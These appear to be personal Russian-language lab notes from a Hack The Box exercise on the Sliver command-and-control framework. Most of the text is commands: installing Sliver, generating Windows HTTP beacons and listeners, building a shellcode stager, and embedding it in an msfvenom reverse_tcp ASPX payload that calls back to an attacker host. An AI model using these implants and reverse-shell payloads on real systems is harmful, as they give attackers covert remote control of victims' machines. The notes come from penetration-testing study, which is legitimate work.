# Sliver
Sliver
# Устновка v1.5.42
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
    chmod +x ./sliver-server_linux
    new-operator -n student -l 10.10.14.193
    multiplayer

    get -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
    mxdelta@htb[/htb]$ chmod +x ./sliver-client_linux
    mxdelta@htb[/htb]$ ./sliver-client_linux import student_10.10.14.193.cfg 

    armory install seatbelt

  # Создание маячков и сессий
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
    http -L 10.10.16.14 -l 9001

# Создание профилей и шелкодов
    Для использования загрузчика нам потребуется создать профиль, прослушиватель этапа и загрузчик, не забыв при этом сгенерировать полезную нагрузку через msfvenom. Обратите внимание, что используемые порты можно изменить в соответствии с вашими потребностями.

    profiles new --http 10.10.14.62:8088 --format shellcode htb

    stage-listener --url tcp://10.10.14.62:4443 --profile htb

    http -L 10.10.14.62 -l 8088

    generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
        //[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt

    После создания поэтапной полезной нагрузки ( staged.txt), нам потребуется сгенерировать msfvenom aspx полезная нагрузка.
 
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx

    Далее нам потребуется принять сгенерированную полезную нагрузку. staged.txt и изменить полезную нагрузку в Page_Loadфункция. byte[]Массив будет определен под другим именем; очень важно указать это. new byte[511]массив из staged.txtв byte[] mO0UYобъявление в приведенном ниже примере в sliver.aspx файл. 
